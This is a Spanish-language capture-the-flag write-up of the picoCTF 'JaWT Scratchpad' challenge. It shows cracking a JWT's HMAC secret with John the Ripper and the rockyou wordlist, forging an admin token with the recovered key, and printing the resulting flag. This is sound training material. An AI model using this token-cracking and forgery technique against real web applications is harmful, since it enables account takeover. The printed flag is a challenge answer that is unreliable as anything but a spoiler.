## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/61864/` or http://jupiter.challenges.picoctf.org:61864
## Solución
- ##### Se obtiene la cookie de la página web JaWT. Después se crea un archivo hasheado y se crackeará la contraseña con el archivo "rockyou.txt".
```
┌──(kali㉿kali)-[~]
└─$ nano cookie
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat cookie
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoibWlndWVsIn0.N4hIwNhPMz6JxK4p59Hm3USJKz9px5JsqEBnEZTuJvE
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                      
amass  dirbuster   fasttrack.txt  john.lst  metasploit  rockyou.txt  wfuzz
dirb   dnsmap.txt  fern-wifi      legion    nmap.lst    sqlmap.txt   wifite.txt
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ sudo apt install john                        
john is already the newest version (1.9.0-Jumbo-1+git20211102-0kali7+b1).
The following packages were automatically installed and are no longer required:
  libavfilter9      libndctl6      libre2-10        openjdk-17-jre           python3-pytzdata
  libdaxctl1        libplacebo338  libroc0.3        openjdk-17-jre-headless  rwho
  libgeos3.12.1t64  libpmem1       libsvtav1enc1d1  python3-diskcache        rwhod
  libjsoncpp25      libpostproc57  libu2f-udev      python3-mistune0         samba-ad-provision
  libjxl0.7         librav1e0      libx265-199      python3-pendulum         samba-dsdb-modules
Use 'sudo apt autoremove' to remove them.

Summary:
  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 0
                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ john cookie -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2024-09-23 13:31) 0.2624g/s 1941Kp/s 1941Kc/s 1941KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- ##### En la página JWT para hacer un Debugger de la cookie encriptada, se desencriptará para modificar lo siguiente:
``` javascript
HEADER
{
  "typ": "JWT",
  "alg": "HS256"
}

PAYLOAD
{
  "user": "miguel" //SE CAMBIARÁ ESTA PARTE POR "admin"
}

VERIFY SIGNATURE
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  *your-256-bit-secret* //EN ESTA PARTE SE INTRODUCIRÁ "ilovepico"
)
```

- ##### Copiaremos la nueva cookie y editaremos la del sitio JaWT, despúes de eso, obtendremos la bandera en la parte del scratchpad.
```
Flag: picoCTF{jawt_was_just_what_you_thought_1ca14548}
```
## Notas Adicionales
- JSON Web Token (JWT) es un estándar abierto (RFC7519) que define un modo ​compacto y ​autocontenido ​para transmitir información segura entre distintas partes utilizando objetos JSON. Una de las características principales de JWT es que esta información puede ser verificada porque es firmada digitalmente.
## Referencias
- [PicoCTF](https://play.picoctf.org)
- [PicoCTF Writeups](https://www.youtube.com/playlist?list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&authuser=0)